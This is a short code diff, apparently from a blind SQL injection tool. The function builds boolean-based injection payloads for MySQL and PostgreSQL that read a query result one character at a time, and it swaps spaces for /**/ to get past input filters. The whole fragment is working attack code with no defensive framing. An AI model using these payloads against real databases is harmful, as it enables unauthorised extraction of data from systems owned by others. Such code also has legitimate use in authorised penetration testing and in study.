@@ -1,6 +1,12 @@
 def is_correct_char(index, char, base_query, row_offset):
     full_query = f"{base_query} LIMIT 1 OFFSET {row_offset}"
+
+    # MYSQL payload (Have "BINARY" and ";")
     payload = f"' OR (SELECT BINARY SUBSTR(({full_query}), {index}, 1)) = '{char}';-- -"
+
+    # PostgreSQL payload
+    payload = f"' OR (SELECT SUBSTR(({full_query}), {index}, 1)) = '{char}'-- -"
+
     # Replace space with /**/
     final_payload = payload.replace(" ", "/**/")
     try:
